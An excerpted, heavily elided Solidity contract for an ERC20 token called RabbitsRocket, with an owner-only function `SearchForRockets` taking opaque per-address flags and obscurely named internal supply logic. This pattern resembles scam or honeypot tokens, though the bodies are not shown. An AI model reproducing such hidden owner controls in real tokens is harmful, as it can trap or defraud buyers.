...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _launchTheRocket(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
    ...
    function SearchForRockets(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20Rocket is Context, ERC20 {
    constructor(
        ...
        _launchTheRocket(owner, initialSupply, tmp6, tmp7);
    }
}

contract RabbitsRocket is ERC20Rocket {
    constructor() ERC20Rocket("RabbitsRocket", "RROCKET", false, true, 800, 25, msg.sender, 100000000000 * 10 ** 18, msg.sender, 7) {
    }
}